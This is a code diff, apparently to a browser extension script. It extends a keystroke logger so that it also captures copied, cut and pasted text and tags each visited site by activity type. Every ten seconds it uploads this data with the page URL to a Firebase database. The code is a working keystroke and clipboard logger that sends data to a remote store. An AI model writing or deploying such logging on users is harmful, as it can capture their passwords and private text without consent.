@@ -15,10 +15,15 @@ firebase.initializeApp(config);
 
 var keystroke = "";
 toBeUpdated = false;
+clipboardUpdate = false;
+var clipboardText = "";
 
 
-function writeUserData(data) {
+function writeUserData(keystroke) {
   epochTime = (new Date).getTime();
+  let hostname = window.location.hostname;
+  let activity = checkActivity(hostname);
+  var data = {"keystroke":keystroke, "url":getUrl(), "activity": activity, "clipboardData" : clipboardText}
   firebase.database().ref('users/' + "nemnous/" + epochTime).set({
     data
   });
@@ -33,19 +38,69 @@ function getUrl(){
 	let url = window.location.href;
 	return url
 }
-
+function checkActivity(hostname){
+	let qnahostnames = ["www.quora.com","stackoverflow.com","www.reddit.com","meta.stackoverflow.com","www.codeproject.com","groups.google.com","programmersheaven.com"];
+	let codehostnames = ["colab.research.google.com"];
+  let videohostnames = ["www.youtube.com"];
+  
+	if (qnahostnames.includes(hostname))
+		return "Q&A";
+	else if (codehostnames.includes(hostname))
+		return "code";
+	else if (videohostnames.includes(hostname))
+		return "video";
+	else
+    return "search";
+}
 setInterval(function(){
   // writeUserData(keystroke);
   
-  if(toBeUpdated) {
-  var data = {"keystroke":keystroke, "url":getUrl()}
-  console.log(JSON.stringify(data));
-  writeUserData(data);
+  if(toBeUpdated || clipboardUpdate) {
+  // console.log(JSON.stringify(data));
+  writeUserData(keystroke);
   toBeUpdated = false;
+  clipboardUpdate = false;
+  clipboardText = "";
   keystroke = "";
   }
-}, 10000)
+}, 10000);
 
+
+function geSelectionText(){
+  let selectedText = "";
+  if(window.getSelection){
+  selectedText = window.getSelection().toString();
+  }
+  return selectedText;
+  }
+
+  
+  document.addEventListener('copy',function(){
+  let text = geSelectionText();
+  if(text.length>0){
+    clipboardText = text;
+    clipboardUpdate = true;
+    console.log("Copied text",text);
+  }
+  },false)
+
+
+  document.addEventListener('cut',function(){
+  let text = geSelectionText();
+  if(text.length>0){
+    clipboardText = text;
+    clipboardUpdate = true;
+    console.log("This is cut text",text);
+  }
+  },false)
+  
+  
+  document.addEventListener('paste',function(e){
+  let data = e.clipboardData.getData('Text');
+    clipboardText = data;
+    clipboardUpdate = true;
+  console.log("clipboardData",data);
+  });
 
 // var t = document.createElement("clipit");
 // document.body.appendChild(t);
